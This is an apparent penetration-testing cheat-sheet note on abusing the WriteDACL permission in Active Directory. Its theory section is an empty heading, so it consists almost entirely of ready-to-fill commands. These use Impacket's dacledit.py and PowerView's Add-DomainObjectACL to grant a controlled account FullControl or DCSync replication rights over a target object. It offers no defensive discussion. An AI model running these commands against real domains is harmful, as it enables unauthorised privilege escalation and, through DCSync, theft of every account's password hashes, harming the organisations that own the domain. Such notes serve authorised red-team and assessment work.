---
Primary_category: "[[DACL ABUSE]]"
title: "GRANT RIGHTS (WRITEDACL)"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[DACL ABUSE]]

#### *Theory*

> ***WriteDACL***

---

#### *Abuse - UNIX-like*

##### *Impacket's DACLedit.py*

> ***[DACLedit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py)***

###### *Grant FullControl Right*

> ***GenericAll***

```bash
dacledit.py -dc-ip '<DC>' -principal '<CONTROLLED_OBJECT>' -target '<TARGET_OBJECT>' -action write -rights FullControl '<DOMAIN>/<USER>:<PASSWD>'
```

###### *Grant DCSync Rights*

> ***DS-Replication-Get-Changes***
> ***DS-Replication-Get-Changes-All***

```bash
dacledit.py -dc-ip '<DC>' -principal '<CONTROLLED_OBJECT>' -target '<TARGET_OBJECT>' -action write -rights DCSync '<DOMAIN>/<USER>:<PASSWD>'
```

##### *BloodyAD*

> ***[BloodyAD](https://github.com/CravateRouge/bloodyAD)***

---

#### *Abuse - Windows*

##### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L10)***

###### *Grant FullControl Right*

> ***GenericAll***

```powershell
$passwd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $passwd)
```

```powershell
Add-DomainObjectACL -Credential $cred -Rights 'All' -PrincipalIdentity '<CONTROLLED_OBJECT>' -TargetIdentity '<TARGET_OBJECT>'
```

###### *Grant DCSync Rights*

> ***DS-Replication-Get-Changes***
> ***DS-Replication-Get-Changes-All***

```powershell
$passwd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $passwd)
```

```powershell
Add-DomainObjectACL -Credential $cred -Rights 'DCSync' -PrincipalIdentity '<CONTROLLED_OBJECT>' -TargetIdentity '<TARGET_OBJECT>'
```